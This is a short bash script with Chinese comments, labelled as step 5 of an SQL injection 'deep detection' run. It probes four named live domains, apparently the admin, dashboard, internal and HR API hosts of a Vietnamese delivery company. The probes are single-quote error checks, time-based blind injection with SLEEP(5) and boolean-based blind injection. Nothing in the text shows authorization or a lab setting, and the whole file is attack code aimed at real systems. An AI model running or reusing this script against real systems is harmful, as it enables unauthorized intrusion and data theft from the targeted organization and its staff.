#!/bin/bash
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "步骤5：SQL注入深度检测"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# 测试目标
TARGETS=(
    "https://admin.giaohangtietkiem.vn"
    "https://dashboard.ghtk.vn"
    "https://inter.ghtk.vn"
    "https://hrm-api.ghtk.vn"
)

echo "[*] 测试SQL注入点..."

for target in "${TARGETS[@]}"; do
    echo ""
    echo "━━━ $target ━━━"
    
    # 测试1：单引号
    echo "[1] 单引号测试"
    curl -sk "$target/api/user?id=1'" -m 3 2>&1 | grep -iE "sql|mysql|syntax|error" | head -3
    
    # 测试2：时间盲注
    echo "[2] 时间盲注测试"
    time_before=$(date +%s)
    curl -sk "$target/api/user?id=1' AND SLEEP(5)--" -m 10 >/dev/null 2>&1
    time_after=$(date +%s)
    time_diff=$((time_after - time_before))
    [ $time_diff -ge 5 ] && echo "  ⚠️  可能存在时间盲注（延时${time_diff}秒）"
    
    # 测试3：布尔盲注
    echo "[3] 布尔盲注测试"
    resp1=$(curl -sk "$target/api/user?id=1' AND '1'='1" -m 3 2>&1)
    resp2=$(curl -sk "$target/api/user?id=1' AND '1'='2" -m 3 2>&1)
    [ "$resp1" != "$resp2" ] && echo "  ⚠️  可能存在布尔盲注"
done

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "✅ SQL注入检测完成"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
